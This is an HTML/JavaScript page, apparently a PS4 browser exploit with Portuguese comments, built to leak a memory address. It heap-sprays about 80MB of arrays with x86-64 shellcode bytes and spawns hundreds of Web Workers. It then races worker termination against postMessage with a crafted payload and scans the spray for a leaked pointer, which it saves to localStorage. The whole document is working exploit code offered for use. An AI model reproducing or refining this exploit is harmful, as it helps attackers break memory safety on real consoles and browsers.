<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 LOW MEM LEAKER</title>
    <style>
        body { background-color: #000; color: #aaa; font-family: monospace; text-align: center; padding: 20px; }
        h1 { color: #fff; border-bottom: 1px solid #555; }
        #status { font-size: 1.5em; border: 1px solid #444; padding: 20px; margin: 20px 0; }
        #saved-leak { color: #ff0; font-size: 1.2em; display: none; border: 1px solid #ff0; padding: 10px;}
        .success { background-color: #050 !important; color: #fff !important; border: 2px solid #0f0; }
    </style>
</head>
<body>

    <h1>LOW MEMORY LEAKER (0x10)</h1>
    
    <div id="saved-leak">
        ATENÇÃO: Um leak anterior foi recuperado!<br>
        <span id="recovered-addr" style="font-size:2em; font-weight:bold;"></span>
    </div>

    <div id="status">INICIANDO...</div>

    <script>
        // --- VERIFICAÇÃO DE EMERGÊNCIA ---
        // Se o console crashou na última vez mas achou o leak, ele estará aqui.
        const saved = localStorage.getItem('ps4_leak');
        if(saved) {
            document.getElementById('saved-leak').style.display = 'block';
            document.getElementById('recovered-addr').innerText = saved;
            document.getElementById('status').innerText = "LEAK RECUPERADO DO CACHE!";
            // Não roda o exploit se já temos o número
            throw new Error("Leak já encontrado."); 
        }

        // --- CONFIGURAÇÃO DE BAIXA MEMÓRIA ---
        const TARGET_THREADS = 417; 
        const SPRAY_SIZE = 512;
        const TARGET_OFFSET = 384; 
        
        // MUDANÇA CRÍTICA: Alvo 0x10000000 (Muito mais fácil de alcançar sem OOM)
        const ADDR_BYTE_3 = 0x10; 

        let workers = [];
        let heapSpray = [];
        
        const blob = new Blob(["setInterval(()=>{}, 100000)"], {type:'text/javascript'});
        const url = URL.createObjectURL(blob);
        const killerBlob = new Blob(["self.close()"], {type:'text/javascript'});
        const killerUrl = URL.createObjectURL(killerBlob);

        // SHELLCODE
        const code = new Uint8Array([
            0x48, 0x8B, 0x04, 0x24,       // mov rax, [rsp] 
            0x48, 0x8D, 0x3D, 0x08, 0x00, 0x00, 0x00, // lea rdi, [rip+8]
            0x48, 0x89, 0x07,             // mov [rdi], rax
            0xC3,                         // ret
            0x00, 0x00, 0x00, 0x00,       // [SLOT]
            0x00, 0x00, 0x00, 0x00        // [SLOT]
        ]);

        function start() {
            document.getElementById('status').innerText = "1. SPRAY ECONÔMICO (0x10)...";
            
            setTimeout(() => {
                try {
                    const code32 = new Uint32Array(code.buffer);
                    
                    // REDUZIDO DRASTICAMENTE: Apenas 80MB de Spray (antes era 500MB+)
                    // Isso deve ser suficiente para cobrir 0x10000000
                    for(let i=0; i<100; i++) { 
                        let arr = new Uint32Array(0x4000); 
                        for(let k=0; k < arr.length; k += code32.length) {
                            for(let j=0; j < code32.length; j++) {
                                if (k+j < arr.length) arr[k+j] = code32[j];
                            }
                        }
                        heapSpray.push(arr);
                    }
                    
                    document.getElementById('status').innerText = "2. SUBINDO THREADS...";
                    // Limpa console log visual para economizar RAM
                    startThreads();
                    
                } catch(e) {
                    document.getElementById('status').innerText = "FALHA OOM INICIAL. Limpe o Cache.";
                }
            }, 500);
        }

        function startThreads() {
            let i = setInterval(() => {
                if (workers.length < TARGET_THREADS) {
                    workers.push(new Worker(url));
                } else {
                    clearInterval(i);
                    document.getElementById('status').innerText = "3. ATAQUE IMEDIATO...";
                    // Sem delay de estabilização longo, para evitar OOM acumulado
                    setTimeout(attack, 1000);
                }
            }, 30);
        }

        function attack() {
            const st = document.getElementById('status');
            st.innerText = ">>> TENTANDO LEAK... <<<";
            
            const payload = new Uint8Array(SPRAY_SIZE);
            payload.fill(0x00); 
            payload[TARGET_OFFSET] = 0x00;
            payload[TARGET_OFFSET+1] = 0x00;
            payload[TARGET_OFFSET+2] = 0x00;
            payload[TARGET_OFFSET+3] = ADDR_BYTE_3; // 0x10

            // Dispara por apenas 2 segundos
            let attempts = 0;
            const attackInt = setInterval(() => {
                const w = new Worker(killerUrl);
                w.terminate();
                try { if(workers.length > 0) workers[0].postMessage(payload); } catch(e){}
                
                attempts++;
                if(attempts > 50) { // Para rápido
                    clearInterval(attackInt);
                    cleanupAndScan();
                }
            }, 20);
        }

        function cleanupAndScan() {
            document.getElementById('status').innerText = "4. LIMPANDO E ESCANEANDO...";
            
            // Mata threads para liberar CPU/RAM
            workers.forEach(w => w.terminate());
            workers = [];

            setTimeout(() => {
                let found = false;
                for(let i=0; i<heapSpray.length; i++) {
                    const arr = heapSpray[i];
                    for(let k=4; k<64; k+=8) {
                        if (arr[k] !== 0 && arr[k] !== 0xC3078948) {
                            if (arr[k+1] !== 0) {
                                saveAndShow(arr[k], arr[k+1]);
                                found = true;
                                break;
                            }
                        }
                    }
                    if(found) break;
                }
                if(!found) document.getElementById('status').innerText = "FALHA: NENHUM LEAK. TENTE NOVAMENTE.";
            }, 1000);
        }

        function saveAndShow(low, high) {
            const hLow = (low >>> 0).toString(16).padStart(8, '0');
            const hHigh = (high >>> 0).toString(16).padStart(8, '0');
            const addr = `0x${hHigh}${hLow}`;
            
            // SALVAMENTO DE EMERGÊNCIA
            localStorage.setItem('ps4_leak', addr);

            document.getElementById('status').innerText = "SUCESSO! SALVO NO CACHE.";
            document.getElementById('status').className = "success";
            
            const div = document.createElement('div');
            div.style.fontSize = "3em";
            div.style.color = "#fff";
            div.innerText = addr;
            document.body.appendChild(div);
        }

        setTimeout(start, 1000);

    </script>
</body>
</html>
